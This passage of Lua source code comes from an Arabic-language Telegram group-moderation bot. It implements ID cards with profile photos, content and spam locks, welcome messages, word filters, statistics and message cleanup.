local Description = Texting[math.random(#Texting)]
if result.photos_[0] then
if not DevFeras:get('DevFeras:id:mute'..msg.chat_id_) then 
if not DevFeras:get('DevFeras:id:photo'..msg.chat_id_) then 
if DevFeras:get("DevFeras:Feras_dev:id:text:"..bot_id) then
newpicid = DevFeras:get("DevFeras:Feras_dev:id:text:"..bot_id)
newpicid = newpicid:gsub('#username',(username or 'لا يوجد'))
newpicid = newpicid:gsub('#photos',(result.total_count_ or 'لا يوجد')) 
newpicid = newpicid:gsub('#game',(user_nkt or 'لا يوجد'))
newpicid = newpicid:gsub('#edit',(edit_msg or 'لا يوجد'))
newpicid = newpicid:gsub('#cont',(cont or 'لا يوجد'))
newpicid = newpicid:gsub('#sticker',(sticker or 'لا يوجد'))
newpicid = newpicid:gsub('#msgs',(user_msgs or 'لا يوجد'))
newpicid = newpicid:gsub('#msgday',(msgsday or 'لا يوجد'))
newpicid = newpicid:gsub('#id',(msg.sender_user_id_ or 'لا يوجد'))
newpicid = newpicid:gsub('#auto',(formsgs(msguser) or 'لا يوجد'))
newpicid = newpicid:gsub('#stast',(id_rank(msg) or 'لا يوجد'))
newpicid = newpicid:gsub('#Description',(Description or 'لا يوجد'))
else
newpicid = "⌁︙معرفك ↫ ❨ "..username.." ❩\n⌁︙ايديك ↫ ❨ "..msg.sender_user_id_.." ❩\n⌁︙رتبتك ↫ "..id_rank(msg).."\n⌁︙صورك ↫ ❨ "..result.total_count_.." ❩\n⌁︙رسائلك ↫ ❨ "..user_msgs.." ❩\n⌁︙تفاعلك ↫ "..formsgs(msguser).."\n⌁︙نقاطك ↫ ❨ "..user_nkt.." ❩\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
end 
if not DevFeras:get("DevFeras:Feras_dev:id:text:"..bot_id..msg.chat_id_) then 
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[0].sizes_[1].photo_.persistent_id_,newpicid,msg.id_,msg.id_.."")
else 
local new_id = DevFeras:get("DevFeras:Feras_dev:id:text:"..bot_id..msg.chat_id_)
local new_id = new_id:gsub('#username',(username or 'لا يوجد'))
local new_id = new_id:gsub('#photos',(result.total_count_ or '')) 
local new_id = new_id:gsub('#game',(user_nkt or 'لا يوجد'))
local new_id = new_id:gsub('#edit',(edit_msg or 'لا يوجد'))
local new_id = new_id:gsub('#cont',(cont or 'لا يوجد'))
local new_id = new_id:gsub('#sticker',(sticker or 'لا يوجد'))
local new_id = new_id:gsub('#msgs',(user_msgs or 'لا يوجد'))
local new_id = new_id:gsub('#msgday',(msgsday or 'لا يوجد'))
local new_id = new_id:gsub('#id',(msg.sender_user_id_ or 'لا يوجد'))
local new_id = new_id:gsub('#auto',(formsgs(msguser) or 'لا يوجد'))
local new_id = new_id:gsub('#stast',(id_rank(msg) or 'لا يوجد'))
local new_id = new_id:gsub('#Description',(Description or 'لا يوجد'))
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[0].sizes_[1].photo_.persistent_id_,new_id,msg.id_,msg.id_.."")
end
else
if DevFeras:get("DevFeras:Feras_dev:id:text:"..bot_id) then
newallid = DevFeras:get("DevFeras:Feras_dev:id:text:"..bot_id)
newallid = newallid:gsub('#username',(username or 'لا يوجد'))
newallid = newallid:gsub('#photos',(result.total_count_ or 'لا يوجد')) 
newallid = newallid:gsub('#game',(user_nkt or 'لا يوجد'))
newallid = newallid:gsub('#edit',(edit_msg or 'لا يوجد'))
newallid = newallid:gsub('#cont',(cont or 'لا يوجد'))
newallid = newallid:gsub('#sticker',(sticker or 'لا يوجد'))
newallid = newallid:gsub('#msgs',(user_msgs or 'لا يوجد'))
newallid = newallid:gsub('#msgday',(msgsday or 'لا يوجد'))
newallid = newallid:gsub('#id',(msg.sender_user_id_ or 'لا يوجد'))
newallid = newallid:gsub('#auto',(formsgs(msguser) or 'لا يوجد'))
newallid = newallid:gsub('#stast',(id_rank(msg) or 'لا يوجد'))
newallid = newallid:gsub('#Description',(Description or 'لا يوجد'))
else
newallid = "⌁︙معرفك ↫ ❨ "..username.." ❩\n⌁︙ايديك ↫ ❨ "..msg.sender_user_id_.." ❩\n⌁︙رتبتك ↫ "..id_rank(msg).."\n⌁︙صورك ↫ ❨ "..result.total_count_.." ❩\n⌁︙رسائلك ↫ ❨ "..user_msgs.." ❩\n⌁︙تفاعلك ↫ "..formsgs(msguser).."\n⌁︙نقاطك ↫ ❨ "..user_nkt.." ❩\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
end 
if not DevFeras:get("DevFeras:Feras_dev:id:text:"..bot_id..msg.chat_id_) then
Dev_Feras(msg.chat_id_, msg.id_, 1, newallid, 1, 'html')
else
local new_id = DevFeras:get("DevFeras:Feras_dev:id:text:"..bot_id..msg.chat_id_)
local new_id = new_id:gsub('#username',(username or 'لا يوجد'))
local new_id = new_id:gsub('#photos',(result.total_count_ or 'لا يوجد')) 
local new_id = new_id:gsub('#game',(user_nkt or 'لا يوجد'))
local new_id = new_id:gsub('#edit',(edit_msg or 'لا يوجد'))
local new_id = new_id:gsub('#cont',(cont or 'لا يوجد'))
local new_id = new_id:gsub('#sticker',(sticker or 'لا يوجد'))
local new_id = new_id:gsub('#msgs',(user_msgs or 'لا يوجد'))
local new_id = new_id:gsub('#msgday',(msgsday or 'لا يوجد'))
local new_id = new_id:gsub('#id',(msg.sender_user_id_ or 'لا يوجد'))
local new_id = new_id:gsub('#auto',(formsgs(msguser) or 'لا يوجد'))
local new_id = new_id:gsub('#stast',(id_rank(msg) or 'لا يوجد'))
local new_id = new_id:gsub('#Description',(Description or 'لا يوجد'))
Dev_Feras(msg.chat_id_, msg.id_, 1, new_id, 1, 'html')  
end
end
else
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙عذرا الايدي معطل ', 1, 'md')
end
else
if DevFeras:get("DevFeras:Feras_dev:id:text:"..bot_id) then
notpicid = DevFeras:get("DevFeras:Feras_dev:id:text:"..bot_id)
notpicid = notpicid:gsub('#username',(username or 'لا يوجد'))
notpicid = notpicid:gsub('#photos',(result.total_count_ or 'لا يوجد')) 
notpicid = notpicid:gsub('#game',(user_nkt or 'لا يوجد'))
notpicid = notpicid:gsub('#edit',(edit_msg or 'لا يوجد'))
notpicid = notpicid:gsub('#cont',(cont or 'لا يوجد'))
notpicid = notpicid:gsub('#sticker',(sticker or 'لا يوجد'))
notpicid = notpicid:gsub('#msgs',(user_msgs or 'لا يوجد'))
notpicid = notpicid:gsub('#msgday',(msgsday or 'لا يوجد'))
notpicid = notpicid:gsub('#id',(msg.sender_user_id_ or 'لا يوجد'))
notpicid = notpicid:gsub('#auto',(formsgs(msguser) or 'لا يوجد'))
notpicid = notpicid:gsub('#stast',(id_rank(msg) or 'لا يوجد'))
notpicid = notpicid:gsub('#Description',(Description or 'لا يوجد'))
else
notpicid = "⌁︙لا استطيع عرض صورتك لانك قمت بحظر البوت او انك لاتمتلك صوره في بروفايلك\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙معرفك ↫ ❨ "..username.." ❩\n⌁︙ايديك ↫ ❨ "..msg.sender_user_id_.." ❩\n⌁︙رتبتك ↫ "..id_rank(msg).."\n⌁︙رسائلك ↫ ❨ "..user_msgs.." ❩\n⌁︙تفاعلك ↫ "..formsgs(msguser).."\n⌁︙نقاطك ↫ ❨ "..user_nkt.." ❩\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
end 
if not DevFeras:get('DevFeras:id:mute'..msg.chat_id_) then
if not DevFeras:get('DevFeras:id:photo'..msg.chat_id_) then
Dev_Feras(msg.chat_id_, msg.id_, 1, notpicid, 1, 'html')
else
Dev_Feras(msg.chat_id_, msg.id_, 1, "⌁︙معرفك ↫ ❨ ["..username.."] ❩\n⌁︙ايديك ↫ ❨ `"..msg.sender_user_id_.."` ❩\n⌁︙رتبتك ↫ "..id_rank(msg).."\n⌁︙صورك ↫ ❨ "..result.total_count_.." ❩\n⌁︙رسائلك ↫ ❨ "..user_msgs.." ❩\n⌁︙تفاعلك ↫ "..formsgs(msguser).."\n⌁︙نقاطك ↫ ❨ "..user_nkt.." ❩\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n", 1, 'md')
end
else
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙عذرا الايدي معطل', 1, 'md')
end end end
tdcli_function ({ ID = "GetUserProfilePhotos", user_id_ = msg.sender_user_id_, offset_ = 0, limit_ = 1 }, getpro, nil)
end
getUser(msg.sender_user_id_, Feras_dev)
end
end 
--     Source DevFeras     --
if ChatType == 'sp' or ChatType == 'gp'  then
if Admin(msg.sender_user_id_, msg.chat_id_) then
if text and text:match("^قفل (.*)$") and ChCheck(msg) then
local lockptf = {string.match(text, "^(قفل) (.*)$")}
if lockptf[2] == "التعديل" then
if not DevFeras:get(DevFeras..'editmsg'..msg.chat_id_) then
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم قفل التعديل بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
DevFeras:set(DevFeras..'editmsg'..msg.chat_id_,true)
else
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙التعديل بالفعل مقفل في المجموعه', 1, 'md')
end
end
if lockptf[2] == "التعديل الميديا" or lockptf[2] == "تعديل الميديا" then
if not DevFeras:get(DevFeras..'editmsg'..msg.chat_id_) then
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم قفل تعديل الميديا\n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
DevFeras:set(DevFeras..'editmsg'..msg.chat_id_,true)
else
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙تعديل الميديا بالفعل مقفل في المجموعه', 1, 'md')
end
end
if lockptf[2] == "الفارسيه" then
if not DevFeras:get(DevFeras..'farsi'..msg.chat_id_) then
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم قفل الفارسيه بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
DevFeras:set(DevFeras..'farsi'..msg.chat_id_,true)
else
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙الفارسيه بالفعل مقفله في المجموعه', 1, 'md')
end
end
if lockptf[2] == "الفشار" then
if DevFeras:get(DevFeras..'fshar'..msg.chat_id_) then
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم قفل الفشار بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
DevFeras:del(DevFeras..'fshar'..msg.chat_id_)
else
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙الفشار بالفعل مقفل في المجموعه', 1, 'md')
end
end
if lockptf[2] == "الطائفيه" then
if DevFeras:get(DevFeras..'taf'..msg.chat_id_) then
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم قفل الطائفيه بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
DevFeras:del(DevFeras..'taf'..msg.chat_id_)
else
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙الطائفيه بالفعل مقفله في المجموعه', 1, 'md')
end
end
if lockptf[2] == "الكفر" then
if DevFeras:get(DevFeras..'kaf'..msg.chat_id_) then
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم قفل الكفر بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
DevFeras:del(DevFeras..'kaf'..msg.chat_id_)
else
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙الكفر بالفعل مقفل في المجموعه', 1, 'md')
end
end
if lockptf[2] == "الفارسيه بالطرد" then
if not DevFeras:get(DevFeras..'farsiban'..msg.chat_id_) then
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم قفل الفارسيه بالطرد \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
DevFeras:set(DevFeras..'farsiban'..msg.chat_id_,true)
else
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙الفارسيه بالطرد بالفعل مقفله ', 1, 'md')
end
end
if lockptf[2] == "البوتات" then
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم قفل البوتات بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
DevFeras:set(DevFeras.."abs:Lock:Bots"..msg.chat_id_,"del")  
end
if lockptf[2] == "البوتات بالطرد" then
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم قفل البوتات بالطرد \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
DevFeras:set(DevFeras.."abs:Lock:Bots"..msg.chat_id_,"kick")  
end
if lockptf[2] == "البوتات بالتقييد" then
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم قفل البوتات بالتقييد \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
DevFeras:set(DevFeras.."abs:Lock:Bots"..msg.chat_id_,"ked")  
end
if lockptf[2] == "التكرار" then 
DevFeras:hset(DevFeras.."abs:Spam:Group:User"..msg.chat_id_ ,"Spam:User","del")  
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم قفل التكرار بالحذف \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
end
if lockptf[2] == "التكرار بالطرد" then 
DevFeras:hset(DevFeras.."abs:Spam:Group:User"..msg.chat_id_ ,"Spam:User","kick")  
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم قفل التكرار بالطرد \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
end
if lockptf[2] == "التكرار بالتقيد" or lockptf[2] == "التكرار بالتقييد" then 
DevFeras:hset(DevFeras.."abs:Spam:Group:User"..msg.chat_id_ ,"Spam:User","keed")  
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم قفل التكرار بالتقييد \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
end
if lockptf[2] == "التكرار بالكتم" then 
DevFeras:hset(DevFeras.."abs:Spam:Group:User"..msg.chat_id_ ,"Spam:User","mute")  
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم قفل التكرار بالكتم \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
end
if Monsh(msg.sender_user_id_, msg.chat_id_) then
if lockptf[2] == "التثبيت" then
if not DevFeras:get(DevFeras..'bot:pin:mute'..msg.chat_id_) then
tdcli_function ({ ID = "GetChannelFull",  channel_id_ = msg.chat_id_:gsub("-100","") }, function(arg,data)  DevFeras:set(DevFeras.."pinnedmsg"..msg.chat_id_,data.pinned_message_id_)  end,nil)
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم قفل التثبيت بنجاح \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
DevFeras:set(DevFeras..'bot:pin:mute'..msg.chat_id_,true)
DevFeras:sadd(DevFeras.."bot:pin:mutepin",msg.chat_id_) 
else
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙التثبيت بالفعل مقفل في المجموعه', 1, 'md')
end end end
end
end
end
--     Source DevFeras     --
if Admin(msg.sender_user_id_, msg.chat_id_) then
if text and text:match("^ضع تكرار (%d+)$") then   
local TextSpam = {string.match(text, "^(ضع تكرار) (%d+)$")}
if tonumber(TextSpam[2]) < 2 then
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙قم بتحديد عدد تكرار اكبر من 2 ', 1, 'md')
else
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙تم وضع عدد التكرار ↫ '..TextSpam[2], 1, 'md')
DevFeras:hset(DevFeras.."abs:Spam:Group:User"..msg.chat_id_ ,"Num:Spam" ,TextSpam[2]) 
end
end
if text and text:match("^ضع زمن التكرار (%d+)$") then  
local TextSpam = {string.match(text, "^(ضع زمن التكرار) (%d+)$")} 
DevFeras:hset(DevFeras.."abs:Spam:Group:User"..msg.chat_id_ ,"Num:Spam:Time" ,TextSpam[2]) 
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙تم وضع زمن التكرار ↫ '..TextSpam[2], 1, 'md')
end
--     Source DevFeras     --
if Owner(msg.sender_user_id_, msg.chat_id_) then
if (text and text == 'ضع الايدي بالصوره') and ChCheck(msg) or (text and text == 'تفعيل الايدي بالصوره') and ChCheck(msg) then
if not DevFeras:get('DevFeras:id:photo'..msg.chat_id_) then
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙الايدي بالصوره بالتاكيد مفعل', 1, 'md')
else
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم تفعيل الايدي بالصوره'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
DevFeras:del('DevFeras:id:photo'..msg.chat_id_)
end end
if (text and text == 'ضع الايدي بدون صوره') and ChCheck(msg) or (text and text == 'تعطيل الايدي بالصوره') and ChCheck(msg) then
if DevFeras:get('DevFeras:id:photo'..msg.chat_id_) then
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙الايدي بالصوره بالتاكيد معطل', 1, 'md')
else
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم تعطيل الايدي بالصوره'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
DevFeras:set('DevFeras:id:photo'..msg.chat_id_,true)
end end 

if (text and text == 'تفعيل الايدي') and ChCheck(msg) then
if not DevFeras:get('DevFeras:id:mute'..msg.chat_id_) then
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙الايدي بالتاكيد مفعل ', 1, 'md')
else
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم تفعيل الايدي بنجاح'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
DevFeras:del('DevFeras:id:mute'..msg.chat_id_)
end end 
if (text and text == 'تعطيل الايدي') and ChCheck(msg) then
if DevFeras:get('DevFeras:id:mute'..msg.chat_id_) then
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙الايدي بالتاكيد معطل ', 1, 'md')
else
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم تعطيل الايدي بنجاح'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
DevFeras:set('DevFeras:id:mute'..msg.chat_id_,true)
end end
end
--     Source DevFeras     --
if text and text:match("^ضع رابط$") and ChCheck(msg) or text and text:match("^وضع الرابط$") and ChCheck(msg)  then
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙ارسل رابط المجموعه ليتم حفظه', 1, 'md')
DevFeras:set(DevFeras.."bot:group:link"..msg.chat_id_, 'waiting')
end
end
--     Source DevFeras     --
if text and text:match("^الدعم$") or text and text:match("^المطور$")  then
local link = DevFeras:get(DevFeras.."bot:supports:link")
if link then
if link:match("https://") then
Dev_Feras(msg.chat_id_, msg.id_, 1, "⌁︙تم ارسال بياناتك للمطور \n⌁︙سوف ياتي في اقرب وقت \n⌁︙يمكنك طلب المساعده \n⌁︙من كروب الدعم ↫ ⤈\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n• "..link.." •", 1, "html")
else
Dev_Feras(msg.chat_id_, msg.id_, 1, "⌁︙تم ارسال بياناتك للمطور \n⌁︙سوف ياتي في اقرب وقت \n⌁︙يمكنك طلب المساعده \n⌁︙من بوت تواصل المطور ↫ ⤈\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n• @"..link.." •", 1, "html")
end end end
--     Source DevFeras     --
if Admin(msg.sender_user_id_, msg.chat_id_) then
if text and text:match("^تفعيل الترحيب$") and ChCheck(msg) then
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم تفعيل الترحيب بنجاح'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
DevFeras:set(DevFeras.."bot:welcome"..msg.chat_id_,true)
end
if text and text:match("^تعطيل الترحيب$") and ChCheck(msg) then
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم تعطيل الترحيب بنجاح'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
DevFeras:del(DevFeras.."bot:welcome"..msg.chat_id_)
end
if DevFeras:get(DevFeras..'bot:setwelcome'..msg.chat_id_..':'..msg.sender_user_id_) then 
if text == 'الغاء' then 
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙تم الغاء حفظ كليشة الترحيب', 1, 'md')
DevFeras:del(DevFeras..'bot:setwelcome'..msg.chat_id_..':'..msg.sender_user_id_)
return false  
end 
DevFeras:del(DevFeras..'bot:setwelcome'..msg.chat_id_..':'..msg.sender_user_id_)
DevFeras:set(DevFeras..'welcome:'..msg.chat_id_,text)
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙تم حفظ كليشة الترحيب', 1, 'md')
return false   
end
if text and text:match("^ضع ترحيب$") and ChCheck(msg) or text and text:match("^وضع ترحيب$") and ChCheck(msg) then
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙ارسل لي الترحيب الان\n⌁︙تستطيع اضافة مايلي ↫ ⤈\n⌁︙دالة عرض الاسم ↫ firstname\n⌁︙دالة عرض المعرف ↫ username', 1, 'md')
DevFeras:set(DevFeras..'bot:setwelcome'..msg.chat_id_..':'..msg.sender_user_id_,true)
end
if text and text:match("^حذف الترحيب$") and ChCheck(msg) or text and text:match("^حذف ترحيب$") and ChCheck(msg) then
local Feras_dev = '⌁︙اهلا عزيزي ↫ '..abs_rank(msg)..' \n⌁︙تم حذف الترحيب \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, Feras_dev, 14, string.len(msg.sender_user_id_))
DevFeras:del(DevFeras..'welcome:'..msg.chat_id_)
end
if text and text:match("^جلب الترحيب$") and ChCheck(msg) or text and text:match("^جلب ترحيب$") and ChCheck(msg) or text and text:match("^الترحيب$") and ChCheck(msg) then
local wel = DevFeras:get(DevFeras..'welcome:'..msg.chat_id_)
if wel then
Dev_Feras(msg.chat_id_, msg.id_, 1, wel, 1, 'md')
else
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙لم يتم وضع الترحيب \n⌁︙ارسل ( ضع ترحيب ) للحفظ ', 1, 'md')
end
end
--     Source DevFeras     --
if DevFeras:get(DevFeras..'bot:setdescription'..msg.chat_id_..':'..msg.sender_user_id_) then  
if text == 'الغاء' then 
Dev_Feras(msg.chat_id_, msg.id_, 1, "⌁︙تم الغاء حفظ الوصف", 1, 'md')
DevFeras:del(DevFeras..'bot:setdescription'..msg.chat_id_..':'..msg.sender_user_id_)
return false  
end 
DevFeras:del(DevFeras..'bot:setdescription'..msg.chat_id_..':'..msg.sender_user_id_)
https.request('https://api.telegram.org/bot'..TokenBot..'/setChatDescription?chat_id='..msg.chat_id_..'&description='..text) 
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙تم تغيير وصف المجموعه', 1, 'md')
return false  
end 
if text and text:match("^ضع وصف$") and ChCheck(msg) or text and text:match("^وضع وصف$") and ChCheck(msg) then  
DevFeras:set(DevFeras..'bot:setdescription'..msg.chat_id_..':'..msg.sender_user_id_,true)
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙ارسل لي الوصف الان', 1, 'md')
end
--     Source DevFeras     --
if text and text == "منع" and msg.reply_to_message_id_ == 0 and ChCheck(msg) then       
Dev_Feras(msg.chat_id_, msg.id_, 1, "⌁︙ارسل لي الكلمه الان", 1, 'md') 
DevFeras:set(DevFeras.."abs:filter"..msg.sender_user_id_..msg.chat_id_,"add")  
return false  
end    
if DevFeras:get(DevFeras.."abs:filter"..msg.sender_user_id_..msg.chat_id_) == "add" then
if text == 'الغاء' then 
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙تم الغاء امر المنع', 1, 'md')
DevFeras:del(DevFeras.."abs:filter"..msg.sender_user_id_..msg.chat_id_)  
return false  
end   
Dev_Feras(msg.chat_id_, msg.id_, 1, "⌁︙تم منع الكلمه ↫ "..text, 1, 'html')
DevFeras:del(DevFeras.."abs:filter"..msg.sender_user_id_..msg.chat_id_)  
DevFeras:hset(DevFeras..'bot:filters:'..msg.chat_id_, text,'newword')
return false
end
if text and text == "الغاء منع" and msg.reply_to_message_id_ == 0 and ChCheck(msg) then       
Dev_Feras(msg.chat_id_, msg.id_, 1, "⌁︙ارسل لي الكلمه الان", 1, 'md') 
DevFeras:set(DevFeras.."abs:filter"..msg.sender_user_id_..msg.chat_id_,"del")  
return false  
end    
if DevFeras:get(DevFeras.."abs:filter"..msg.sender_user_id_..msg.chat_id_) == "del" then   
if text == 'الغاء' then 
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙تم الغاء امر الغاء المنع', 1, 'md')
DevFeras:del(DevFeras.."abs:filter"..msg.sender_user_id_..msg.chat_id_)  
return false  
end   
if not DevFeras:hget(DevFeras..'bot:filters:'..msg.chat_id_, text) then  
Dev_Feras(msg.chat_id_, msg.id_, 1, "⌁︙الكلمه ↫ "..text.." غير ممنوعه", 1, 'html')
DevFeras:del(DevFeras.."abs:filter"..msg.sender_user_id_..msg.chat_id_)  
else
DevFeras:hdel(DevFeras..'bot:filters:'..msg.chat_id_, text)
Dev_Feras(msg.chat_id_, msg.id_, 1, "⌁︙الكلمه ↫ "..text.." تم الغاء منعها", 1, 'html')
DevFeras:del(DevFeras.."abs:filter"..msg.sender_user_id_..msg.chat_id_)  
end
return false
end
--     Source DevFeras     --
if SudoBot(msg.sender_user_id_, msg.chat_id_) then
if text and text == "الاحصائيات" and ChCheck(msg) or text and text == "↫ الاحصائيات ⌁" then
local gps = DevFeras:scard(DevFeras.."bot:groups") local users = DevFeras:scard(DevFeras.."bot:userss") local allmgs = DevFeras:get(DevFeras.."bot:allmsgs")
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙عدد المشتركين ↫ ❨ '..users..' ❩\n⌁︙عدد المجموعات ↫ ❨ '..gps..' ❩\n⌁︙مجموع الرسائل ↫ ❨ '..allmgs..' ❩\n ✓', 1, 'md')
end
if text and text == "المشتركين" and ChCheck(msg) or text and text == "↫ المشتركين ⌁" then
local users = DevFeras:scard(DevFeras.."bot:userss")
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙عدد المشتركين ↫ ❨ '..users..' ❩', 1, 'md')
end
end
--     Source DevFeras     --
if text and text == 'المجموعات' and ChCheck(msg) or text and text == '↫ المجموعات ⌁' then
if not SudoBot(msg.sender_user_id_, msg.chat_id_) then
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙للمطورين فقط ', 1, 'md')
else
local list = DevFeras:smembers(DevFeras.."bot:groups")
local t = '⌁︙مجموعات البوت ↫ ⤈ \n'
for k,v in pairs(list) do
t = t..k.."~ : `"..v.."`\n" 
end
if #list == 0 then
t = '⌁︙*لا يوجد مجموعات مفعله*'
end
Dev_Feras(msg.chat_id_, msg.id_, 1,t, 1, 'md')
end end
--     Source DevFeras     --
if text and text:match('^تنظيف (%d+)$') and ChCheck(msg) then  
if not DevFeras:get(DevFeras..'Delete:Time'..msg.chat_id_..':'..msg.sender_user_id_) then  
local Number = tonumber(text:match('^تنظيف (%d+)$')) 
if Number > 1000 then 
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙لاتستطيع تنظيف اكثر من 1000 رساله', 1, 'md')
return false  
end  
local Message = msg.id_
for i=1,tonumber(Number) do
DeleteMessage(msg.chat_id_,{[0]=Message})
Message = Message - 1048576 
end
Dev_Feras(msg.chat_id_, msg.id_, 1, '⌁︙تم تنظيف *'..Number..'* من الرسائل', 1, 'md')
DevFeras:setex(DevFeras..'Delete:Time'..msg.chat_id_..':'..msg.sender_user_id_,300,true)
end 
end
if text == "تنظيف المشتركين" and Sudo(msg) and ChCheck(msg) then 
local pv = DevFeras:smembers(DevFeras.."bot:userss")
local sendok = 0
for i = 1, #pv do
tdcli_function({ID='GetChat',chat_id_ = pv[i]
},function(arg,dataq)
tdcli_function ({ ID = "SendChatAction",  
chat_id_ = pv[i], action_ = {  ID = "SendMessageTypingAction", progress_ = 100} 
},function(arg,data) 
